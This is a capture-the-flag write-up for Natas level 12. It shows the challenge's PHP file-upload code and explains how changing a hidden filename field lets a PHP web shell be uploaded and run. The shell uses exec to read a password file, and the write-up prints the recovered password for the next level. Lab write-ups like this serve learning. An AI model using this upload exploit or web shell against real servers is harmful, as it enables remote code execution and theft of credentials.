# Writeup level 12
We can upload a JPEG (up to 1KB)

** Source Code **

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

Looking at the source code we have no restrictions to what we can upload. Like there is no check if it is an actual jpg. Also looking at the HTML Source we have something very intresting.

```html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```
We can see in the code above that the **target_path** variable takes the value from the POST Parameter called **filename**. It just appends the .jpg on the random generated String but before it gets send. So what we can do is, we can upload a php file and change that .jpg to .php in the HTML. This leads to a successfully performed **Remote Code Execution** (RCE).

## Remote Code Execution (RCE)
It basically is what the name already says. You can execute your own code on the remote machine.

## Back to the challenge
I am just going to create a simple php file that cat outs the content of the natas13 password file.  
**PHP File**

```php
<?php

$result = exec("cat /etc/natas_webpass/natas13");
echo $result;

?>
```

- Select the php file to upload
- Change the .jpg value in the filename attribute
- Upload the file
- Click on the new link

The password is:  
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY





